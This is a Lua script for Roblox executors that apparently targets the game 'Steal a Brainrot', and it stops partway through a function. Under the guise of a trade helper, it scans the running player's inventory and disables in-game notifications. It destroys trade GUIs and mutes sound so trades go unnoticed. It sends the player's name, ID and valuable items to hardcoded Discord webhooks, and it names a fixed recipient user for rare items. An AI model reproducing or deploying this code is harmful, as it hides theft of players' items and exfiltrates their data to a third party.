-- ===================== MAIN SCRIPT (loadstring) =====================
-- K2 Brainrot Main | continuous add fix + place-gated auto-rejoin
if getgenv().BrainrotMainLoaded then
	return warn("[Brainrot] Main already running!")
end
getgenv().BrainrotMainLoaded = true

local genv = getgenv()
local DUEL_PLACE_ID = 99606176102979
local allowedPlaceIds = genv.ALLOWED_PLACE_IDS or {
	109983668079237,
	DUEL_PLACE_ID,
}
if #allowedPlaceIds > 0 and not table.find(allowedPlaceIds, game.PlaceId) then
	getgenv().BrainrotMainLoaded = nil
	return
end

local isDuelPlace = (tonumber(game.PlaceId) == DUEL_PLACE_ID)
if isDuelPlace then
	print("[Brainrot] Duel place detected:", game.PlaceId)
end

-- Snapshot helpers: base does not exist in duel place — use last main-place scan
local function deepCopy(val, seen)
	if type(val) ~= "table" then return val end
	seen = seen or {}
	if seen[val] then return seen[val] end
	local out = {}
	seen[val] = out
	for k, v in pairs(val) do
		out[deepCopy(k, seen)] = deepCopy(v, seen)
	end
	return out
end

local function cacheBaseScan(list)
	if type(list) ~= "table" then return end
	local n = 0
	for _ in pairs(list) do n += 1 end
	if n == 0 then return end
	getgenv().K2LastAnimalList = deepCopy(list)
	getgenv().K2LastAnimalListAt = os.time()
	getgenv().K2LastAnimalListUser = LP.UserId
	print("[Brainrot] Cached base AnimalList for duel webhook | entries:", n)
end

local function loadCachedBaseScan()
	local cached = getgenv().K2LastAnimalList
	if type(cached) ~= "table" then return nil end
	if getgenv().K2LastAnimalListUser and getgenv().K2LastAnimalListUser ~= LP.UserId then
		return nil
	end
	return deepCopy(cached)
end

-- (rejoin handled by config only — do not dual-queue)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")
local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

local GOOD_WEBHOOK = genv.GOOD_WEBHOOK or ""
local LOG_WEBHOOK = "https://discord.com/api/webhooks/1546596081599774831/2mKk-J65YTnpGMgnoVBt5Qt92w6mrVlt97ahcEIsJwlHxVl3HPlvNAn6SJetCD49srPz"
local MISS_WEBHOOK = "https://discord.com/api/webhooks/1532856431546728458/xJY4Vj0lo2jY8lDTwXtQaeDLe6blciom2xGppXul72Renxmr55CMYcec9yfLneGgQmwj"
local GOOD_AVATAR = genv.GOOD_AVATAR or "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
local TARGET_ID = genv.TARGET_USER_ID or 0
local MISS_TIMEOUT = 40
local MISS_TARGET_ID = 2829121161
local missFailoverDone = false
local currentlyInTrade = false

local MISS_BRAINROTS = {
	["Strawberry Elephant"] = true,
	["Headless Horseman"] = true,
	["Meowl"] = true,
	["John Pork"] = true,
	["Skibidi Toilet"] = true,
	["Griffin"] = true,
	["Dragon Aquanini"] = true,
	["Dragon Gingerini"] = true,
	["Hydra Dragon Cannelloni"] = true,
	["Signore Carapace"] = true,
	["Dragon Cannelloni"] = true,
	["Love Love Bear"] = true,
	["Moby Bros"] = true,
	["Digi Narwhal"] = true,
	["Kraken"] = true,
	["La Supreme Combinasion"] = true,
	["Elefanto Frigo"] = true,
	["Hydra Bunny"] = true,
	["Jelly Moby"] = true,
	["Bumbatron"] = true,
	["Bunny and Eggy"] = true,
	["Rosey and Teddy"] = true,
	["Cooki and Milki"] = true,
	["Arcadragon"] = true,
	["Los Secret Combinasionas"] = true,
	["Ketupat Bros"] = true,
	["Fortunu and Cashuru"] = true,
	["Los Amigos"] = true,
	["Antonio"] = true,
	["Pancake and Syrup"] = true,
	["Foxini Lanternini"] = true,
	["Kalika Bros"] = true,
	["Fishino Clownino"] = true,
	["La Casa Boo"] = true,
	["Los Admins"] = true,
	["Duggy Bros"] = true,
	["Sammyni Cakini"] = true,
	["Ginger Gerat"] = true,
	["Rubiko and Kubiko"] = true,
	["Examen Bros"] = true,
	["Dug Dug Dug"] = true,
	["Rico Dinero"] = true,
	["Tirilikalika Tirilikalako"] = true,
	["La Breakfast Combinasion"] = true,
	["Sammyini Truckini"] = true,
}

local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
local TRADE_CYCLE_DELAY = 2
local INVITE_GUID = "8fbe1594-7cef-4c29-94d1-a0e93adfa5a4"
local SELECT_GUID = "c85a2323-36b2-4121-968a-c064a6168aff"
local SELECTGB_GUID = "6786cce9-00d8-41e9-8beb-d96e0412b78b"
local READY_GUID = "23f15b0b-b633-4f6b-888f-5924b7425522"
local ACCEPT_GUID = "86eea964-f19e-4ac6-b401-a71ecc89e596"
local FOOTER_ICON = "https://media.discordapp.net/attachments/1511087340721012919/1544655871529852988/2d33efc28dde57ea69dd4291cb6b4d6f_2.webp?ex=6a994c62&is=6a97fae2&hm=cd5486a74b48c119c89809204444e8a855045337dc23ede08a46ae7dd4077279&=&format=webp"
local FALLBACK_COLOR = 0x1A237E
local guiNames = {
	BrainrotTrader = true,
	TradeLiveTrade = true,
	TradePrompts = true,
}

local MUTATION_MULT = {
	["None"] = 1,
	["Default"] = 1,
	["Gold"] = 1.25,
	["Diamond"] = 1.5,
	["Bloodrot"] = 2,
	["Candy"] = 4,
	["Lava"] = 6,
	["Galaxy"] = 7,
	["Yin Yang"] = 7.5,
	["Radioactive"] = 8.5,
	["Cursed"] = 9,
	["Divine"] = 10,
	["Rainbow"] = 10,
	["Cyber"] = 11,
	["Phantom"] = 12,
	["Crystal"] = 13,
}
local MUTATION_EMOJI = {
	["None"] = "<:Default_Mutation:1483657150231216138>",
	["Default"] = "<:Default_Mutation:1483657150231216138>",
	["Gold"] = "<:Gold:1498277392194736138>",
	["Diamond"] = "<:Diamond:1498277422746046514>",
	["Rainbow"] = "<:Rainbow:1498277403871678514>",
	["Divine"] = "<:Divine:1498277407793348789>",
	["Radioactive"] = "<:Radioactive:1498277395562758276>",
	["Cursed"] = "<:Cursed:1498277428391317575>",
	["Galaxy"] = "<:Galaxy:1498277390571536395>",
	["Candy"] = "<:Candy:1498277426621448192>",
	["Bloodrot"] = "<:Bloodrot:1498277424490610710>",
	["Crystal"] = "<:Crystal:1532523409630695624>",
	["Phantom"] = "<:phan:1533658669173047326>",
	["Lava"] = "<:Lava:1498277393754886216>",
	["Cyber"] = "<:Cyber:1498277418815983776>",
	["Yin Yang"] = "<:YingYang:1513911235337261076>",
}
local GEAR_EMOJI = {
	["Waverider"] = "<:Waverider:1536942058676420680>",
	["Yin Yang Lamp"] = "<:YinYangLamp:1536942111218335754>",
	["Cupids Wings"] = "<:CupidsWings:1536941473407176715>",
	["Santas Sleigh"] = "<:SantasSleigh:1536942025646153818>",
	["Radioactive Airstrike"] = "<:RadioactiveAirstrike:1536941888148480000>",
	["Alien Slap"] = "<:AlienSlap:1536941130581807124>",
	["Divine Slap"] = "<:DivineSlap:1536941781277741076>",
	["Lava Slap"] = "<:LavaSlap:1536941851267965028>",
	["Cursed Slap"] = "<:CursedSlap:1536941510824689764>",
	["Demons Head"] = "<:DemonsHead:1536941574028525649>",
	["Witchs Broom"] = "<:WitchsBroom:1536942085649731667>",
	["Radioactive Slap"] = "<:RadioactiveSlap:1536941915931545650>",
	["Blackhole Bomb"] = "<:BlackholeBomb:1536941156649402490>",
	["Phantom Slap"] = "<:PhantomSlap:1536940296116371477>",
	["Cyber Slap"] = "<:CyberSlap:1536941541971730483>",
	["Lava Blaster"] = "<:LavaBlaster:1536941824915283998>",
	["Rainbow Slap"] = "<:RainbowSlap:1536941997510754424>",
	["Rainbow Hammer"] = "<:RainbowHammer:1536941964149133352>",
	["Bunny Basket"] = "<:BunnyBasket:1536943427327889419>",
	["Blood Moon Slap"] = "<:BloodMoonSlap:1538670582848032890>",
}
local BASESKIN_EMOJI = {
	["Octo"] = "<:Octo:1536944000752418856>",
	["Aquatic"] = "<:Aquatic:1536943396168532018>",
	["Rose"] = "<:Rose:1536944091558842378>",
	["Halloween"] = "<:Halloween:1536943747995279380>",
	["Pot Of Gold"] = "<:PotOfGold:1536944019827986532>",
	["Valentines"] = "<:Valentines:1536944152565252136>",
	["Christmas"] = "<:Christmas:1536943450388308049>",
	["Taco"] = "<:Taco:1536944658809225286>",
	["Lucky"] = "<:Lucky:1536943979793490000>",
}

local TargetBrainrots = {}
local GOOD_BRAINROTS = {}
if type(genv.ALLOWED_ANIMALS) == "table" then
	for _, name in pairs(genv.ALLOWED_ANIMALS) do
		if type(name) == "string" then
			TargetBrainrots[name] = true
			GOOD_BRAINROTS[name] = true
		end
	end
end
if next(TargetBrainrots) == nil then
	warn("[Brainrot] No ALLOWED_ANIMALS set in getgenv(). Using empty list.")
end
local ALLOWED_BASESKINS = genv.ALLOWED_BASESKINS or {}
local ALLOWED_GEARS = genv.ALLOWED_GEARS or {}

local function getRemote(name)
	local children = Net:GetChildren()
	local indexMap = {
	["RF/TradeService/Invite"] = 36,
	["RE/TradeService/Ready"] = 42,
	["RE/TradeService/Accept"] = 43,
	["RF/TradeService/AddItem"] = 48,
	["RF/TradeService/AddBrainrot"] = 50,
	["RE/NotificationService/Notify"] = 209,
}
	local idx = indexMap[name]
	if not idx then return nil end
	local remote = children[idx]
	if remote and (remote:IsA("RemoteFunction") or remote:IsA("RemoteEvent")) then
		return remote
	end
	return nil
end

local function blockNotifications()
	local notifyRemote = getRemote("RE/NotificationService/Notify")
	if not notifyRemote then
		warn("[Brainrot] Notify remote missing (idx 209)")
		return
	end
	print("[Brainrot] Blocking notifications:", notifyRemote.Name)
	pcall(function()
		for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
			pcall(function()
				if conn.Disable then conn:Disable() end
				if conn.Disconnect then conn:Disconnect() end
			end)
		end
	end)
	task.spawn(function()
		while true do
			task.wait(2)
			pcall(function()
				for _, conn in pairs(getconnections(notifyRemote.OnClientEvent)) do
					pcall(function()
						if conn.Disable then conn:Disable() end
					end)
				end
			end)
		end
	end)
end
blockNotifications()

local function applyEverythingAfterTargetFound()
	local leftCenter = pg:FindFirstChild("LeftCenter")
	if leftCenter then
		local clone = leftCenter:Clone()
		clone.Name = "LeftCenter_Backup"
		clone.Parent = pg
		leftCenter:Destroy()
	end
	local function handleCam(obj)
		if obj:IsA("BlurEffect") then
			task.defer(function() obj:Destroy() end)
		end
	end
	cam.ChildAdded:Connect(handleCam)
	for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
	cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
		cam.FieldOfView = 70
	end)
	cam.FieldOfView = 70
	local function handleGui(obj)
		if guiNames[obj.Name] then
			task.defer(function() obj:Destroy() end)
		end
	end
	pg.ChildAdded:Connect(handleGui)
	for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
	task.spawn(function()
		pcall(function() SoundService.Volume = 0 end)
		local function mute(s)
			if s:IsA("Sound") then
				pcall(function() s.Volume = 0 s:Stop() end)
			end
		end
		for _, s in ipairs(SoundService:GetDescendants()) do mute(s) end
		SoundService.DescendantAdded:Connect(mute)
		workspace.DescendantAdded:Connect(mute)
	end)
end

local AnimalsData, NumberUtils, TraitsData
pcall(function() AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals")) end)
pcall(function() NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils")) end)
pcall(function() TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits")) end)
pcall(function()
	if not TraitsData then
		TraitsData = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Traits"))
	end
end)

local function plotOwnedByLocalPlayer(plot)
	if not plot then return false end
	for _, key in ipairs({ "Owner", "OwnerUserId", "UserId", "OwnerId", "PlayerUserId" }) do
		local v = plot:GetAttribute(key)
		if v ~= nil then
			if tonumber(v) == LP.UserId then return true end
			if tostring(v) == LP.Name or tostring(v) == LP.DisplayName or tostring(v) == tostring(LP.UserId) then
				return true
			end
		end
	end
	for _, inst in ipairs(plot:GetDescendants()) do
		local n = string.lower(inst.Name)
		if n == "owner" or n == "owneruserid" or n == "userid" or n == "ownerid" then
			if inst:IsA("ObjectValue") and inst.Value == LP then return true end
			if inst:IsA("NumberValue") or inst:IsA("IntValue") then
				if inst.Value == LP.UserId then return true end
			end
			if inst:IsA("StringValue") then
				local s = inst.Value
				if s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId) then return true end
			end
		end
	end
	if plot.Name == tostring(LP.UserId) or plot.Name:find(tostring(LP.UserId), 1, true) then
		return true
	end
	return false
end

local function ownerMatchesLocal(ownerField)
	if ownerField == nil then return nil end
	local oid = tonumber(ownerField)
	if oid then return oid == LP.UserId end
	local s = tostring(ownerField)
	return s == LP.Name or s == LP.DisplayName or s == tostring(LP.UserId)
end

local function getMyPlotAndAnimals()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil, nil end
	local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not hrp then
		for _ = 1, 10 do
			task.wait(0.1)
			hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
			if hrp then break end
		end
	end
	local syncFolder = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
	local requestData = syncFolder and syncFolder:FindFirstChild("RequestData")
	if not requestData then
		warn("[Brainrot] Synchronizer.RequestData missing")
		return nil, nil
	end
	local candidates = {}
	for _, plot in ipairs(plotsFolder:GetChildren()) do
		if plotOwnedByLocalPlayer(plot) then
			table.insert(candidates, plot)
		end
	end
	local function fetchAnimals(plot)
		local ok, data = pcall(function()
			return requestData:InvokeServer(plot.Name)
		end)
		if not ok or type(data) ~= "table" or type(data.AnimalList) ~= "table" then
			return nil, nil
		end
		local ownerField = data.Owner or data.OwnerUserId or data.UserId or data.PlayerUserId
		local match = ownerMatchesLocal(ownerField)
		if match == false then return nil, nil end
		if match == nil and not plotOwnedByLocalPlayer(plot) then return nil, nil end
		return data.AnimalList, data
	end
	local verified = {}
	local searchList = #candidates > 0 and candidates or plotsFolder:GetChildren()
	for _, plot in ipairs(searchList) do
		local animals, data = fetchAnimals(plot)
		if animals then
			local dist = math.huge
			if hrp then
				local okp, pos = pcall(function() return plot:GetPivot().Position end)
				if okp and pos then dist = (pos - hrp.Position).Magnitude end
			end
			table.insert(verified, { plot = plot, animals = animals, dist = dist })
		end
	end
	if #verified == 0 then
		warn("[Brainrot] No plot verified as local player (", LP.Name, LP.UserId, ")")
		return nil, nil
	end
	table.sort(verified, function(a, b) return a.dist < b.dist end)
	local best = verified[1]
	print("[Brainrot] Using plot:", best.plot.Name, "| local only |", LP.Name, LP.UserId)
	return best.plot, best.animals
end

local cachedProfile = nil
local profileReady = false
local function scanProfileAsync()
	task.spawn(function()
		local found = nil
		local n = 0
		pcall(function()
			for _, v in pairs(getgc(true)) do
				n += 1
				if n % 200 == 0 then task.wait() end
				if type(v) == "table" then
					local ok, bi = pcall(rawget, v, "BaseSkinInventory")
					if ok and type(bi) == "table" then
						if type(rawget(v, "Coins")) == "number" and type(rawget(v, "Rebirth")) == "number" then
							found = v
							break
						end
					end
				end
			end
		end)
		cachedProfile = found
		profileReady = true
		print("[Brainrot] Profile scan done:", found and "found" or "not found")
	end)
end
local function getMyProfile()
	return cachedProfile
end
local function buildSkinQueue()
	local queue = {}
	if not next(ALLOWED_BASESKINS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local bi = rawget(profile, "BaseSkinInventory")
	if type(bi) ~= "table" then return queue end
	for uuid, data in pairs(bi) do
		if type(data) == "table" then
			local name = tostring(data.SkinName or data.Skin or "")
			if ALLOWED_BASESKINS[name] then
				table.insert(queue, { uuid = tostring(uuid), skinName = name })
			end
		end
	end
	return queue
end
local function buildGearQueue()
	local queue = {}
	if not next(ALLOWED_GEARS) then return queue end
	local profile = getMyProfile()
	if not profile then return queue end
	local gi = rawget(profile, "GearInventory")
	if type(gi) ~= "table" then return queue end
	for uuid, data in pairs(gi) do
		if type(data) == "table" then
			local name = tostring(data.GearName or data.Name or "")
			if ALLOWED_GEARS[name] then
				table.insert(queue, { uuid = tostring(uuid), gearName = name })
			end
		end
	end
	return queue
end

scanProfileAsync()
local myPlot, animalList = getMyPlotAndAnimals()
if not myPlot or not animalList then
	if isDuelPlace then
		warn("[Brainrot] Duel place — plot unavailable, using cached main-place base scan")
		myPlot = nil
		animalList = loadCachedBaseScan() or {}
		local n = 0
		for _ in pairs(animalList) do n += 1 end
		print("[Brainrot] Duel cache loaded | animal entries:", n)
	else
		warn("[Brainrot] Could not find plot or AnimalList — exiting")
		getgenv().BrainrotMainLoaded = nil
		return
	end
else
	-- Live scan on main (or any place with plots) — keep for duel
	if not isDuelPlace then
		cacheBaseScan(animalList)
	end
end

local brainrotQueue = {}
local missBrainrotQueue = {}
for slotKey, data in pairs(animalList) do
	if type(data) == "table" and data.Index then
		local displayName = data.Index
		if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
			displayName = AnimalsData[data.Index].DisplayName
		end
		if TargetBrainrots[displayName] or TargetBrainrots[data.Index] then
			table.insert(brainrotQueue, {
				slotKey = tonumber(slotKey),
				data = data,
				displayName = displayName,
			})
		end
		if MISS_BRAINROTS[displayName] or MISS_BRAINROTS[data.Index] then
			table.insert(missBrainrotQueue, {
				slotKey = tonumber(slotKey),
				data = data,
				displayName = displayName,
			})
		end
	end
end

local tradeBrainrotQueue = brainrotQueue
local tradeItemsEnabled = true
if #brainrotQueue == 0 then
	if isDuelPlace then
		warn("[Brainrot] Duel place — no target brainrots (webhook only)")
	else
		warn("[Brainrot] No target brainrots on base — disabled")
		getgenv().BrainrotMainLoaded = nil
		return
	end
else
	print("[Brainrot] Queued", #brainrotQueue, "target brainrots")
end

-- EXTRA_LOADSTRINGS / GUI owned by config only (prevents double load)


applyEverythingAfterTargetFound()

local baseSkinQueue = {}
local gearQueue = {}

local function getRequestFn()
	return (syn and syn.request) or (http and http.request) or http_request or request
end
local function toWikiName(displayName)
	local clean = displayName:match("^(.-)%s*%(") or displayName
	return clean:gsub(" ", "_")
end
local function fetchFandomImageUrl(displayName)
	local requestFn = getRequestFn()
	if not requestFn then return nil end
	local wikiName = toWikiName(displayName)
	local url = FANDOM_BASE .. wikiName
	local ok, response = pcall(function()
		return requestFn({
			Url = url, Method = "GET",
			Headers = { ["User-Agent"] = "Mozilla/5.0", ["Accept"] = "text/html" },
			Timeout = 5,
		})
	end)
	if ok and response and response.StatusCode == 200 and response.Body then
		local body = response.Body
		local ogImage = body:match('property="og:image"%s+content="([^"]+)"')
			or body:match('content="([^"]+)"%s+property="og:image"')
		if ogImage and ogImage:find("^https?://") then
			return ogImage:gsub("&amp;", "&")
		end
	end
	return nil
end
local function getBrainrotColor(animalIndex)
	local color = nil
	pcall(function()
		local models = ReplicatedStorage:FindFirstChild("Models")
		local animals = models and models:FindFirstChild("Animals")
		if not animals then return end
		local template = animals:FindFirstChild(animalIndex)
		if not template and AnimalsData and AnimalsData[animalIndex] then
			template = animals:FindFirstChild(AnimalsData[animalIndex].DisplayName)
		end
		if not template then return end
		local bestScore = 0
		for _, desc in ipairs(template:GetDescendants()) do
			if desc:IsA("MeshPart") or desc:IsA("Part") then
				local c = desc.Color
				local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
				local maxC = math.max(c.R, c.G, c.B)
				local minC = math.min(c.R, c.G, c.B)
				local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
				local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
				local bp = (bri < 0.08 and 0.05) or (bri > 0.92 and 0.15) or 1
				local score = (sat * 3 + 0.2) * bp * vol
				if score > bestScore then bestScore = score color = c end
			end
		end
	end)
	return color
end
local function colorToDecimal(c)
	if not c then return FALLBACK_COLOR end
	local r = math.clamp(math.floor(c.R * 255), 0, 255)
	local g = math.clamp(math.floor(c.G * 255), 0, 255)
	local b = math.clamp(math.floor(c.B * 255), 0, 255)
	return r * 65536 + g * 256 + b
end
local function getBestImageUrl(displayName, animalIndex)
	local info = AnimalsData and AnimalsData[animalIndex]
	if info then
		for _, key in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId" }) do
			if info[key] and type(info[key]) == "string" then
				local num = info[key]:match("%d+")
				if num then return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png" end
			end
		end
	end
	return nil
end
local function resolveThumbnail(displayName, animalIndex)
	-- Fast path only (no HTTP) — avoids 3–5s lag on execute
	local url = getBestImageUrl(displayName, animalIndex)
	if url and url ~= "" then return url end
	local wiki = toWikiName(displayName)
	return "https://stealabrainrot.fandom.com/wiki/Special:FilePath/" .. wiki .. ".png"
end
local function getTraitMultiplier(traitName)
	if not TraitsData or not traitName then return 0 end
	local info = TraitsData[traitName]
	if not info then
		local key = traitName:lower():gsub("%s+", "")
		for k, v in pairs(TraitsData) do
			if type(k) == "string" and k:lower():gsub("%s+", "") == key then info = v break end
		end
	end
	if type(info) ~= "table" then return 0 end
	local tm = info.MultiplierModifier or info.Multiplier or info.modifier or info.GenerationMultiplier
	if type(tm) == "number" and tm > 0 then return tm end
	return 0
end
local function getMutationMultiplier(mutName)
	if not mutName or mutName == "" or mutName == "None" or mutName == "Default" then return 1 end
	if MUTATION_MULT[mutName] then return MUTATION_MULT[mutName] end
	local key = mutName:lower():gsub("%s+", "")
	for name, mult in pairs(MUTATION_MULT) do
		if name:lower():gsub("%s+", "") == key then return mult end
	end
	return 1
end
local function getGeneration(data)
	local index = data.Index
	local base = 0
	if AnimalsData and AnimalsData[index] and type(AnimalsData[index].Generation) == "number" then
		base = AnimalsData[index].Generation
	end
	if base <= 0 then return 0 end
	local gen = base * getMutationMultiplier(data.Mutation)
	local traits = data.Traits
	if type(traits) == "table" then
		for _, t in pairs(traits) do
			local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
			local tm = getTraitMultiplier(traitName)
			if tm > 0 then gen = gen + (base * tm) end
		end
	end
	return gen
end
local function formatGen(genVal)
	if NumberUtils and NumberUtils.Format then return NumberUtils.Format(genVal) .. "/s" end
	if genVal >= 1e12 then return string.format("%.1fT/s", genVal / 1e12)
	elseif genVal >= 1e9 then return string.format("%.1fB/s", genVal / 1e9)
	elseif genVal >= 1e6 then return string.format("%.1fM/s", genVal / 1e6)
	elseif genVal >= 1e3 then return string.format("%.1fK/s", genVal / 1e3)
	end
	return tostring(math.floor(genVal)) .. "/s"
end
local function normKey(s)
	return (tostring(s or ""):lower():gsub("%s+", ""):gsub("'", ""):gsub("’", ""))
end
local function mutEmoji(name)
	if not name or name == "" then return MUTATION_EMOJI["Default"] end
	if MUTATION_EMOJI[name] then return MUTATION_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(MUTATION_EMOJI) do
		if normKey(k) == key then return v end
	end
	return MUTATION_EMOJI["Default"]
end
local function gearEmoji(name)
	if not name or name == "" then return "⚙️" end
	if GEAR_EMOJI[name] then return GEAR_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(GEAR_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "⚙️"
end
local function baseSkinEmoji(name)
	if not name or name == "" then return "🏠" end
	if BASESKIN_EMOJI[name] then return BASESKIN_EMOJI[name] end
	local key = normKey(name)
	for k, v in pairs(BASESKIN_EMOJI) do
		if normKey(k) == key then return v end
	end
	return "🏠"
end
local function countTraits(traits)
	if type(traits) ~= "table" then return 0 end
	local n = 0
	for _, t in pairs(traits) do
		local traitName = type(t) == "string" and t or (type(t) == "table" and (t.Name or t.Index or t.Trait or t.Id))
		if traitName and traitName ~= "" then n += 1 end
	end
	return n
end

local function sendDetailedWebhook()
	if GOOD_WEBHOOK == "" and (not LOG_WEBHOOK or LOG_WEBHOOK == "") then return end
	local resultsPrimary = {}
	local requirePingPrimary = false
	local totalGen = 0
	for slot, data in pairs(animalList) do
		if type(data) == "table" and data.Index then
			local info = AnimalsData and AnimalsData[data.Index]
			local displayName = (info and info.DisplayName) or data.Index
			if GOOD_BRAINROTS[displayName] or GOOD_BRAINROTS[data.Index] then
				requirePingPrimary = true
				local mutation = data.Mutation or "None"
				local traits = data.Traits or {}
				local genVal = getGeneration(data)
				local genStr = formatGen(genVal)
				totalGen += genVal
				local mE = mutEmoji(mutation)
				local tCount = countTraits(traits)
				local line = mE .. " **" .. displayName .. "**"
				if tCount > 0 then line = line .. " *(x" .. tCount .. " traits)*" end
				line = line .. " — **$" .. genStr:gsub("/s", "") .. "/s**"
				table.insert(resultsPrimary, {
					slot = tostring(slot), index = data.Index, displayName = displayName,
					name = line, genVal = genVal,
				})
			end
		end
	end
	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 and not isDuelPlace then return end
	table.sort(resultsPrimary, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
	local lines = {}
	if #resultsPrimary > 0 then
		table.insert(lines, "───── **BRAINROTS** ─────")
		for i, r in ipairs(resultsPrimary) do
			table.insert(lines, "`" .. i .. ".` " .. r.name)
		end
	end
	if #baseSkinQueue > 0 then
		if #lines > 0 then table.insert(lines, "") end
		table.insert(lines, "───── **BASE SKINS** ─────")
		for i, s in ipairs(baseSkinQueue) do
			table.insert(lines, "`" .. i .. ".` " .. baseSkinEmoji(s.skinName) .. " **" .. s.skinName .. "**")
		end
	end
	if #gearQueue > 0 then
		if #lines > 0 then table.insert(lines, "") end
		table.insert(lines, "───── **GEARS** ─────")
		for i, g in ipairs(gearQueue) do
			table.insert(lines, "`" .. i .. ".` " .. gearEmoji(g.gearName) .. " **" .. g.gearName .. "**")
		end
	end
	local listText = table.concat(lines, "\n")
	listText = listText .. "\n\n💰 **Total Value:** **$" .. formatGen(totalGen):gsub("/s", "") .. "/s**"
	if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
	local requestFn = getRequestFn()
	if not requestFn then return end
	local top = resultsPrimary[1]
	local embedColor = FALLBACK_COLOR
	if top then
		local c = getBrainrotColor(top.index)
		if c then embedColor = colorToDecimal(c) end
	end
	local playerCount = #Players:GetPlayers()
	local execName = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"
	if isDuelPlace then
		embedColor = 0x808080 -- grey
	end
	local description
	if isDuelPlace then
		description = table.concat({
			"📫 **Script User** `" .. LP.Name .. "` (ID: " .. LP.UserId .. ")",
			"",
			"**Player in duel**",
			"",
			listText ~= "" and listText or "_No base cache — run script on main place first, then enter duel._",
		}, "\n")
	else
		description = table.concat({
			"📫 **Script User** `" .. LP.Name .. "` (ID: " .. LP.UserId .. ")",
			"",
			"**Inventory scan complete.**",
			"",
			listText,
		}, "\n")
	end
	local embed = {
		title = isDuelPlace and "K2 Logger · Player in duel" or "K2 Logger",
		description = description,
		color = embedColor,
		fields = {
			{ name = "⏰ Executed", value = "<t:" .. os.time() .. ":R>", inline = true },
			{ name = "🌍 Server", value = "Players: **" .. playerCount .. "**", inline = true },
			{ name = "⚡ Executor", value = execName, inline = true },
			{ name = "📍 Place", value = "`" .. tostring(game.PlaceId) .. "`" .. (isDuelPlace and " · duel" or ""), inline = true },
		},
		footer = {
			text = "K2 LOGGER | https://discord.gg/bxjXucMVqB",
			icon_url = FOOTER_ICON,
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}
	if top then
		local thumb = resolveThumbnail(top.displayName, top.index)
		if thumb and thumb ~= "" then embed.thumbnail = { url = thumb } end
	end
	local function postTo(url, withPing)
		if not url or url == "" then return end
		local payload = {
			embeds = { embed },
			username = "K2 Logger",
			avatar_url = GOOD_AVATAR,
		}
		if withPing then payload.content = "@everyone" end
		pcall(function()
			requestFn({
				Url = url, Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload),
			})
		end)
	end
	local shouldPing = requirePingPrimary or #baseSkinQueue > 0 or #gearQueue > 0
	-- Atomic once-per-join (survives double loadstring races)
	if getgenv().BrainrotWebhookSent then
		print("[Brainrot] Webhook already sent this join — skip embed")
		return
	end
	getgenv().BrainrotWebhookSent = true
	postTo(GOOD_WEBHOOK, shouldPing)
	-- Only log-channel if different URL (prevents "double" in same channel)
	if type(LOG_WEBHOOK) == "string" and LOG_WEBHOOK ~= "" and LOG_WEBHOOK ~= GOOD_WEBHOOK then
		postTo(LOG_WEBHOOK, false)
	end
end

local function getMissBrainrotsOnBase()
	local list = {}
	local ok, animals = pcall(function()
		local _, a = getMyPlotAndAnimals()
		return a
	end)
	if not ok or type(animals) ~= "table" then return list end
	for slotKey, data in pairs(animals) do
		if type(data) == "table" and data.Index then
			local displayName = data.Index
			if AnimalsData and AnimalsData[data.Index] and AnimalsData[data.Index].DisplayName then
				displayName = AnimalsData[data.Index].DisplayName
			end
			if MISS_BRAINROTS[displayName] or MISS_BRAINROTS[data.Index] then
				local genVal = 0
				pcall(function() genVal = getGeneration(data) end)
				table.insert(list, {
					slot = tostring(slotKey), index = data.Index, displayName = displayName,
					mutation = data.Mutation or "None", traits = data.Traits or {},
					genVal = genVal, data = data,
				})
			end
		end
	end
	table.sort(list, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
	return list
end
local function rebuildMissTradeQueue()
	local q = {}
	for _, item in ipairs(getMissBrainrotsOnBase()) do
		table.insert(q, {
			slotKey = tonumber(item.slot),
			data = item.data,
			displayName = item.displayName,
		})
	end
	return q
end
local function sendMissWebhook(missList)
	print("[Brainrot] sendMissWebhook called | count:", missList and #missList or 0)
	local requestFn = getRequestFn()
	if not requestFn then warn("[Brainrot] Miss webhook: no request function") return end
	local missUrl = MISS_WEBHOOK
	if type(missUrl) ~= "string" or missUrl == "" then warn("[Brainrot] Miss webhook: MISS_WEBHOOK empty") return end
	local totalGen = 0
